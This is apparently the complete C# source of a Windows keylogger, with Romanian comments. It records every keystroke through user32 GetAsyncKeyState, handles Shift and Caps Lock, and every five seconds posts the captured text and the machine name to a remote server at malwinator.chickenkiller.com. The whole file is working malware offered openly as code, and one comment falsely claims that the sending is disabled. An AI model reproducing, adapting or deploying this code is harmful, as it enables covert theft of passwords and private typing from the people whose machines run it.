using System.Linq.Expressions;
using System.Runtime.InteropServices;

namespace NetKeyLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Obține instanța unică a clasei KeyLoggerSingleton
            KeyLoggerSingleton keyLogger = KeyLoggerSingleton.GetInstance();

            // Pornește funcția KeyLogger
            keyLogger.StartKeyLogger();
        }
    }

    public class KeyLoggerSingleton
    {
        // Instanța unică a clasei KeyLoggerSingleton
        private static KeyLoggerSingleton instance;
        private static readonly object lockObj = new object();

        // Variabile pentru a ține minte starea tastelor Shift și Caps Lock
        private bool shiftKeyPressed;
        private bool capsLockOn;

        // Importă funcțiile din user32.dll pentru a obține starea tastelor
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        // URL-ul serverului
        private Uri url;

        // Numele calculatorului
        private string machineName;

        // Datele pentru formularul cu numele calculatorului
        private KeyValuePair<string, string> machineNameFormData;

        // Client HTTP pentru trimiterea datelor
        private HttpClient server;

        // Șirul de caractere în care se vor stoca tastele apăsate
        private string str;

        // Dicționar cu codurile tastelor și caracterele corespunzătoare
        private Dictionary<int, string> myDictionary;

        // Constructorul privat pentru a preveni crearea instanțelor multiple
        private KeyLoggerSingleton()
        {
            //url = new Uri("http://10.11.97.215:5000");
            url = new Uri("http://malwinator.chickenkiller.com");
            machineName = Environment.MachineName;
            machineNameFormData = new KeyValuePair<string, string>("name", machineName);
            server = new HttpClient();
            str = "";

            myDictionary = new Dictionary<int, string>
            {
                { 1, "" }, { 2, "" }, { 8, "" }, { 9, "[TAB]" }, { 13, "[ENTER]" }, { 16, "" },
                { 17, "" }, { 19, "[PAUSE]" }, { 20, "" }, { 27, "[ESC]" }, { 32, " " },
                { 33, "[PAGE UP]" }, { 34, "[Page Down]" }, { 35, "[End]" }, { 36, "[Home]" },
                { 37, "[Left]" }, { 38, "[Up]" }, { 39, "[Right]" }, { 40, "[Down]" },
                { 44, "[Print Screen]" }, { 45, "[Insert]" }, { 46, "[Delete]" }, { 48, "0" },
                { 49, "1" }, { 50, "2" }, { 51, "3" }, { 52, "4" }, { 53, "5" }, { 54, "6" },
                { 55, "7" }, { 56, "8" }, { 57, "9" }, { 65, "a" }, { 66, "b" }, { 67, "c" },
                { 68, "d" }, { 69, "e" }, { 70, "f" }, { 71, "g" }, { 72, "h" }, { 73, "i" },
                { 74, "j" }, { 75, "k" }, { 76, "l" }, { 77, "m" }, { 78, "n" }, { 79, "o" },
                { 80, "p" }, { 81, "q" }, { 82, "r" }, { 83, "s" }, { 84, "t" }, { 85, "u" },
                { 86, "v" }, { 87, "w" }, { 88, "x" }, { 89, "y" }, { 90, "z" }, { 91, "[Windows]" },
                { 92, "[Windows]" }, { 93, "[List]" }, { 96, "0" }, { 97, "1" }, { 98, "2" },
                { 99, "3" }, { 100, "4" }, { 101, "5" }, { 102, "6" }, { 103, "7" }, { 104, "8" },
                { 105, "9" }, { 106, "*" }, { 107, "+" }, { 109, "-" }, { 110, "," }, { 111, "/" },
                { 112, "[F1]" }, { 113, "[F2]" }, { 114, "[F3]" }, { 115, "[F4]" }, { 116, "[F5]" },
                { 117, "[F6]" }, { 118, "[F7]" }, { 119, "[F8]" }, { 120, "[F9]" }, { 121, "F[10]" },
                { 122, "F[11]" }, { 123, "F[12]" }, { 144, "[Num Lock]" }, { 145, "[Scroll Lock]" },
                { 160, "" }, { 162, "[Ctrl]" }, { 163, "[Ctrl]" }, { 164, "[Alt]" }, { 165, "[Alt]" },
                { 186, ";" }, { 187, "=" }, { 188, "," }, { 189, "-" }, { 190, "." }, { 191, "/" },
                { 219, "[" }, { 220, "\\" }, { 221, "]" }, { 222, "'" }, { 226, "\\" }, { 332, " " },
                { 348, ")" }, { 349, "!" }, { 350, "@" }, { 351, "#" }, { 352, "$" }, { 353, "%" },
                { 354, "^" }, { 355, "&" }, { 356, "*" }, { 357, "(" }, { 365, "A" }, { 366, "B" },
                { 367, "C" }, { 368, "D" }, { 369, "E" }, { 370, "F" }, { 371, "G" }, { 372, "H" },
                { 373, "I" }, { 374, "J" }, { 375, "K" }, { 376, "L" }, { 377, "M" }, { 378, "N" },
                { 379, "O" }, { 380, "P" }, { 381, "Q" }, { 382, "R" }, { 383, "S" }, { 384, "T" },
                { 385, "U" }, { 386, "V" }, { 387, "W" }, { 388, "X" }, { 389, "Y" }, { 390, "Z" },
                { 396, ")" }, { 397, "!" }, { 398, "@" }, { 399, "#" }, { 400, "$" }, { 401, "%" },
                { 402, "^" }, { 403, "&" }, { 404, "*" }, { 405, "(" }, { 486, ":" }, { 487, "+" },
                { 488, "<" }, { 489, "_" }, { 490, ">" }, { 491, "?" }, { 519, "{" }, { 520, "|" },
                { 521, "}" }, { 522, "\"" }
            };
        }

        // Metoda publică statică pentru a obține instanța unică a clasei KeyLoggerSingleton
        public static KeyLoggerSingleton GetInstance()
        {
            lock (lockObj)
            {
                if (instance == null)
                {
                    instance = new KeyLoggerSingleton();
                }
            }
            return instance;
        }

        // Funcția KeyLogger
        public void StartKeyLogger()
        {
            str = ""; // Inițializează șirul de caractere în care se vor stoca tastele apăsate

            // Creează un timer pentru a trimite datele la fiecare 5 secunde
            Timer timer = new Timer(TimerCallback, null, TimeSpan.FromSeconds(5), TimeSpan.FromSeconds(5));
            while (true)
            {
                // Verifică starea tastelor Caps Lock și Shift
                capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;
                shiftKeyPressed = (GetKeyState(0x10) & 0x8000) != 0;
                try{
                    for (int i = 0; i < 255; i++)
                    {
                        if (GetAsyncKeyState(i) == 32769)
                        {
                            if (capsLockOn == true)
                            {
                                if (shiftKeyPressed == true)
                                {
                                    str += myDictionary[i]; // Dacă Shift și Caps Lock sunt apăsate, adaugă caracterele normale
                                }
                                else
                                {
                                    if (myDictionary.ContainsKey(i + 300))
                                    {
                                        str += myDictionary[i + 300]; // Dacă doar Caps Lock este apăsat, adaugă caracterele mari
                                    }
                                    else
                                    {
                                        str += myDictionary[i];
                                    }
                                }
                            }
                            else
                            {
                                if (shiftKeyPressed == true)
                                {
                                    if (myDictionary.ContainsKey(i + 300))
                                    {
                                        str += myDictionary[i + 300]; // Dacă doar Shift este apăsat, adaugă caracterele mari
                                    }
                                    else
                                    {
                                        str += myDictionary[i];
                                    }
                                }
                                else
                                {
                                    str += myDictionary[i]; // Dacă nici Caps Lock, nici Shift nu sunt apăsate, adaugă caracterele normale
                                }
                            }
                        }
                    }
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                    continue;
                }
            }
        }

        // Funcția pentru a scrie output-ul
        private void WriteOutput(string value)
        {
            // Această funcție ar trimite datele către server, dar este comentată
            KeyValuePair<string, string> logFormData = new KeyValuePair<string, string>("key", value);

            string requestResult = server.PostAsync(url + "/log", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> {
                machineNameFormData,
                logFormData
             })).Result.Content.ReadAsStringAsync().Result;

            System.Console.WriteLine(requestResult);

            // Resetează șirul de caractere și afișează valoarea pe consolă
            str = "";
            //Console.Write(value);
        }

        // Funcția apelată de timer la fiecare 5 secunde pentru a scrie output-ul
        private void TimerCallback(object state)
        {
            WriteOutput(str);
        }
    }
}